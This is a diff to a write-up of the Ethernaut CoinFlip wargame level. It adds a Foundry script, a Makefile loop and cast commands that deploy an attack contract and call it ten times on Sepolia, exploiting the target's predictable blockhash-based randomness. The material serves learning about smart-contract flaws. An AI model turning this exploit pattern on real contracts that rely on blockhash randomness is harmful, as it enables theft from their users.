@@ -68,4 +68,72 @@ contract CoinFlipAttack {
 }
 ```
 
-We use an Interface since we mainly just want to deal with `flip` method from the original contract. Then in the attack contract, we reimplemented the "randomness" logic as original contract.
+We use an Interface since we mainly just want to deal with `flip` method from the original contract. Then in the attack contract, we reimplemented the "randomness" logic as original contract and wired the result directly to `flip` method.
+
+In `CoinFlip.s.sol`:
+
+```solidity
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import {CoinFlip} from "../src/CoinFlip.sol";
+import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";
+
+contract CoinFlipScript is Script {
+    address TARGET_ADDRESS = 0xXXXXX;
+    CoinFlip coinFlip = CoinFlip(TARGET_ADDRESS);
+    
+    function run() external {
+        vm.startBroadcast();
+        CoinFlipAttack coinFlipAttack = new CoinFlipAttack(TARGET_ADDRESS);
+        coinFlipAttack.attack();
+        vm.stopBroadcast();
+        console.log("After attack: consecutiveWins =", coinFlip.consecutiveWins());
+    }
+}
+```
+
+We have to pay extra attention that we cannot use a for loop to do it ten times since there's a mechanism in the original contract to prevent transactions from the same block:
+
+```solidity
+if (lastHash == blockValue) {
+    revert();
+}
+```
+
+So we have to run the script ten times. We use a Makefile to automate this process:
+
+```makefile
+# Makefile
+
+ifneq (,$(wildcard .env))
+    include .env
+    export
+endif
+
+TIMES ?= 10
+SCRIPT := script/CoinFlip.s.sol:CoinFlipScript
+RPC_URL ?= $(SEPOLIA_RPC_URL)
+ACCOUNT ?= default
+
+run-one:
+	forge script $(SCRIPT) --broadcast --rpc-url $(RPC_URL) --account $(ACCOUNT) -vv
+
+run-loop:
+	@i=1; \
+	while [ $$i -le $(TIMES) ]; do \
+	  echo "=== Running attempt $$i of $(TIMES) ==="; \
+	  make run-one; \
+	  i=$$(( $$i + 1 )); \
+	done
+
+.PHONY: run-one run-loop
+```
+
+We can always check the `consecutiveWins()` using Foundry `cast`:
+
+```bash
+cast call 0xXXXXXXXXX "consecutiveWins()(uint256)" --rpc-url $SEPOLIA_RPC_URL
+```
+
+If you run `make run-one` each for a time, you can use this command to see an increment to the `consecutiveWins()`.
